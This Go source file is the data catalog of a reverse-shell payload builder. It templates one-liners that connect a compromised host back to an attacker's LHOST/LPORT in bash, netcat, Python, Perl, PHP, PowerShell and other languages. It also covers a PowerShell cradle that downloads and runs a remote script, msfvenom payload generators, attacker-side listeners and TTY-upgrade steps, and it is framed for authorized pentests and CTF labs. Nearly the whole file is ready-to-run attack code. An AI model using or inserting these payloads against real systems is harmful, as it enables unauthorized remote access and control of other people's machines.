package main

// revshellCatalog is a reverse-shell cheat sheet turned into a builder: set your
// attacker IP (LHOST) and port (LPORT) once per payload and copy a ready-to-run
// one-liner for almost any language or binary you find on the box, plus the
// matching listeners, encrypted/interactive variants, msfvenom generators, and
// the TTY-upgrade steps. The {LHOST}/{LPORT}/{PAYLOAD} placeholders are woven
// into each template in place (see Tool.Command / isPlaceholder).
//
// These are the standard offensive-security payloads (revshells.com /
// PayloadsAllTheThings) you'd otherwise keep in a notes file — for authorized
// pentests, CTFs, and lab boxes (HTB/THM). The engagement-scope guard that
// covers the other modes applies here too when a command is Run.
var revshellCatalog = []Tool{

	// ── Listeners (attacker side) ────────────────────────────────────────────
	{
		Name: "nc listener", Binary: "nc -lvnp {LPORT}", Category: "listener",
		Desc: "Catch a shell — netcat listening (-l listen, -v verbose, -n no DNS, -p port)",
		Flags: []Flag{rsLPORT()},
	},
	{
		Name: "rlwrap nc listener", Binary: "rlwrap -cAr nc -lvnp {LPORT}", Category: "listener",
		Desc: "netcat listener wrapped in rlwrap for arrow keys, history, and line editing",
		Flags: []Flag{rsLPORT()},
	},
	{
		Name: "ncat TLS listener", Binary: "ncat --ssl -lvnp {LPORT}", Category: "listener",
		Desc: "Nmap ncat with TLS — pairs with an --ssl victim payload to encrypt the shell",
		Flags: []Flag{rsLPORT()},
	},
	{
		Name: "socat TTY listener", Binary: "socat -d -d file:$(tty),raw,echo=0 TCP-LISTEN:{LPORT}", Category: "listener",
		Desc: "Fully interactive listener — your terminal becomes the remote PTY (use with a socat pty victim)",
		Flags: []Flag{rsLPORT()},
	},
	{
		Name: "pwncat-cs", Binary: "pwncat-cs -lp {LPORT}", Category: "listener",
		Desc: "Feature-rich listener: auto TTY upgrade, file transfer, persistence, privesc enumeration",
		Flags: []Flag{rsLPORT()},
	},
	{
		Name:   "metasploit handler",
		Binary: `msfconsole -q -x "use exploit/multi/handler; set payload {PAYLOAD}; set LHOST {LHOST}; set LPORT {LPORT}; exploit"`,
		Category: "listener",
		Desc:     "Generic multi/handler — set PAYLOAD to match whatever you fired (meterpreter or shell)",
		Flags: []Flag{
			rsLHOST(), rsLPORT(),
			{Flag: "{PAYLOAD}", Name: "payload", Kind: KindString, Required: true,
				Placeholder: "linux/x64/shell_reverse_tcp",
				Desc:        "MSF payload to handle — e.g. windows/x64/meterpreter/reverse_tcp"},
		},
	},

	// ── Linux shells ─────────────────────────────────────────────────────────
	{
		Name: "bash -i tcp", Binary: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1", Category: "linux shell",
		Desc: "Classic Bash reverse shell over /dev/tcp — the first thing to try on a Linux box",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "bash -c tcp", Binary: "bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'", Category: "linux shell",
		Desc: "Same payload wrapped in bash -c — handy when injecting into a single argument",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "bash fd 196", Binary: "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196", Category: "linux shell",
		Desc: "File-descriptor variant that sidesteps some bash restrictions / word filters",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "bash read-line", Binary: "exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done", Category: "linux shell",
		Desc: "Reads commands line by line over fd 5 — works where interactive bash does not",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "bash udp", Binary: "bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1", Category: "linux shell",
		Desc: "Bash reverse shell over UDP — pair with an `nc -u -lvnp` listener",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "mkfifo nc", Binary: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f", Category: "linux shell",
		Desc: "Named-pipe trick for netcat builds without -e (OpenBSD nc / busybox)",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "nc -e", Binary: "nc {LHOST} {LPORT} -e /bin/bash", Category: "linux shell",
		Desc: "Only works on netcat compiled with -e (GNU/traditional) — fast when available",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "nc.traditional -e", Binary: "nc.traditional {LHOST} {LPORT} -e /bin/bash", Category: "linux shell",
		Desc: "The -e-capable netcat on Debian/Kali when plain nc refuses -e",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "busybox nc", Binary: "busybox nc {LHOST} {LPORT} -e /bin/sh", Category: "linux shell",
		Desc: "Handy on embedded / Alpine systems where busybox is all you have",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "ncat -e", Binary: "ncat {LHOST} {LPORT} -e /bin/bash", Category: "linux shell",
		Desc: "Nmap ncat reverse shell with -e",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "ncat --ssl -e", Binary: "ncat --ssl {LHOST} {LPORT} -e /bin/bash", Category: "linux shell",
		Desc: "Encrypted shell back to an `ncat --ssl -lvnp` listener",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "telnet pipe", Binary: "TF=$(mktemp -u);mkfifo $TF && telnet {LHOST} {LPORT} 0<$TF | /bin/sh 1>$TF", Category: "linux shell",
		Desc: "Last-resort shell when only telnet is present",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},

	// ── Scripting languages ──────────────────────────────────────────────────
	{
		Name:   "python3 pty",
		Binary: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`,
		Category: "scripting",
		Desc:     "Python3 reverse shell that spawns a real PTY (arrow keys, tab-complete) in one line",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "python pty",
		Binary: `python -c 'import socket,os,pty;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`,
		Category: "scripting",
		Desc:     "Python 2 version of the PTY reverse shell",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "python3 -c",
		Binary: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
		Category: "scripting",
		Desc:     "Dumb (non-PTY) Python3 shell — smaller, upgrade the TTY afterwards",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "perl",
		Binary: `perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
		Category: "scripting",
		Desc:     "Perl reverse shell using /bin/sh",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "perl (no sh)",
		Binary: `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
		Category: "scripting",
		Desc:     "Perl without /bin/sh — works where sh is missing (incl. Windows Perl)",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "ruby",
		Binary: `ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
		Category: "scripting",
		Desc:     "Ruby reverse shell using /bin/sh",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "ruby (no sh)",
		Binary: `ruby -rsocket -e'c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd.to_s,"r"){|io|c.print io.read}end'`,
		Category: "scripting",
		Desc:     "Ruby reverse shell for Windows (no /bin/sh)",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "php exec",
		Binary: `php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'`,
		Category: "scripting",
		Desc:     "PHP reverse shell via exec() — try these in order; hosts disable different functions",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "php system",
		Binary: `php -r '$sock=fsockopen("{LHOST}",{LPORT});system("/bin/sh -i <&3 >&3 2>&3");'`,
		Category: "scripting",
		Desc:     "PHP reverse shell via system()",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "php shell_exec",
		Binary: `php -r '$sock=fsockopen("{LHOST}",{LPORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`,
		Category: "scripting",
		Desc:     "PHP reverse shell via shell_exec()",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "php backticks",
		Binary: "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});`/bin/sh -i <&3 >&3 2>&3`;'",
		Category: "scripting",
		Desc:     "PHP reverse shell via the backtick operator when exec/system are blocked",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "lua",
		Binary: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
		Category: "scripting",
		Desc:     "Lua reverse shell (needs luasocket)",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "awk",
		Binary: `awk 'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
		Category: "scripting",
		Desc:     "Reverse shell in pure gawk — useful on minimal boxes",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "node.js",
		Binary: `node -e 'sh=require("child_process").spawn("/bin/sh");var c=new (require("net").Socket)();c.connect({LPORT},"{LHOST}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'`,
		Category: "scripting",
		Desc:     "Node.js reverse shell",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "golang",
		Binary: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{LHOST}:{LPORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/g.go && go run /tmp/g.go`,
		Category: "scripting",
		Desc:     "Compile-and-run Go reverse shell on a box with the Go toolchain",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},

	// ── Windows ──────────────────────────────────────────────────────────────
	{
		Name:   "powershell tcp",
		Binary: `powershell -nop -W hidden -noni -ep bypass -c "$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"`,
		Category: "windows",
		Desc:     "Self-contained PowerShell reverse shell — no file drop, paste straight into a Windows shell",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name:   "powershell IEX cradle",
		Binary: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/shell.ps1')"`,
		Category: "windows",
		Desc:     "Staged: pull shell.ps1 (e.g. Nishang Invoke-PowerShellTcp) from your HTTP server and run it in memory",
		Flags: []Flag{rsLHOST()},
	},
	{
		Name:   "powershell -enc builder",
		Binary: `powershell -nop -w hidden -e $(echo -n "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/shell.ps1')" | iconv -t UTF-16LE | base64 -w0)`,
		Category: "windows",
		Desc:     "Build a -EncodedCommand payload from Linux (UTF-16LE + base64 of the cradle)",
		Flags: []Flag{rsLHOST()},
	},
	{
		Name: "nc.exe", Binary: "nc.exe {LHOST} {LPORT} -e cmd.exe", Category: "windows",
		Desc: "Upload nc.exe first — classic Windows netcat reverse shell",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "powercat", Binary: "powercat -c {LHOST} -p {LPORT} -e cmd.exe", Category: "windows",
		Desc: "Import powercat.ps1 first (IEX); -e cmd.exe gives an interactive shell",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},

	// ── Encrypted / fully interactive ────────────────────────────────────────
	{
		Name: "socat pty", Binary: "socat TCP:{LHOST}:{LPORT} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane", Category: "interactive",
		Desc: "Fully interactive shell to a socat TCP-LISTEN listener — no manual TTY upgrade needed",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "socat exec", Binary: "socat TCP:{LHOST}:{LPORT} EXEC:/bin/sh", Category: "interactive",
		Desc: "Minimal socat reverse shell",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "openssl client", Binary: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s", Category: "interactive",
		Desc: "Encrypted victim shell — pair with the openssl gen cert + openssl s_server tools below",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "openssl gen cert", Binary: "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'", Category: "interactive",
		Desc: "One-off self-signed cert for the openssl / ncat TLS listener (attacker side)",
		Flags: []Flag{},
	},
	{
		Name: "openssl s_server", Binary: "openssl s_server -quiet -key key.pem -cert cert.pem -port {LPORT}", Category: "interactive",
		Desc: "Encrypted listener to catch the openssl client shell (attacker side)",
		Flags: []Flag{rsLPORT()},
	},

	// ── msfvenom generators (produce a payload file) ─────────────────────────
	{
		Name: "msfvenom linux elf", Binary: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf", Category: "msfvenom",
		Desc: "Standalone Linux x64 ELF reverse shell to drop and run (catch with nc)",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "msfvenom windows exe", Binary: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe", Category: "msfvenom",
		Desc: "Windows x64 staged-less reverse shell exe (catch with nc or multi/handler)",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "msfvenom meterpreter", Binary: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o met.exe", Category: "msfvenom",
		Desc: "Meterpreter exe — catch with exploit/multi/handler and the matching payload",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "msfvenom php", Binary: "msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php", Category: "msfvenom",
		Desc: "PHP reverse shell file for upload/LFI (add a leading <?php if needed)",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "msfvenom war", Binary: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war", Category: "msfvenom",
		Desc: "Deployable JSP/WAR reverse shell for Tomcat manager",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},
	{
		Name: "msfvenom aspx", Binary: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o shell.aspx", Category: "msfvenom",
		Desc: "ASPX reverse shell for IIS upload",
		Flags: []Flag{rsLHOST(), rsLPORT()},
	},

	// ── TTY upgrade (run these inside a caught dumb shell) ────────────────────
	{
		Name:   "upgrade: python pty",
		Binary: `python3 -c 'import pty;pty.spawn("/bin/bash")'`,
		Category: "tty upgrade",
		Desc:     "Step 1 — spawn a PTY in a dumb shell (swap python3 for python if needed)",
		Flags: []Flag{},
	},
	{
		Name: "upgrade: stty raw", Binary: "stty raw -echo; fg", Category: "tty upgrade",
		Desc: "Step 2 — Ctrl+Z to background, run this locally, press Enter twice, then `export TERM=xterm`",
		Flags: []Flag{},
	},
	{
		Name: "upgrade: set size", Binary: "stty rows 38 columns 190", Category: "tty upgrade",
		Desc: "Match the remote PTY to your window (get your real values from `stty -a`)",
		Flags: []Flag{},
	},
	{
		Name: "upgrade: script", Binary: "script -qc /bin/bash /dev/null", Category: "tty upgrade",
		Desc: "Alternative PTY upgrade when Python is unavailable",
		Flags: []Flag{},
	},
}

// rsLHOST / rsLPORT return the attacker-address placeholder flags shared by most
// reverse-shell payloads. They are returned fresh each call so every tool gets
// its own copy to edit.
func rsLHOST() Flag {
	return Flag{Flag: "{LHOST}", Name: "LHOST", Kind: KindString, Required: true,
		Placeholder: "10.10.14.7", Desc: "Attacker IP the victim connects back to (your tun0 on HTB/THM)"}
}

func rsLPORT() Flag {
	return Flag{Flag: "{LPORT}", Name: "LPORT", Kind: KindString, Required: true,
		Placeholder: "4444", Desc: "Port your listener is waiting on"}
}
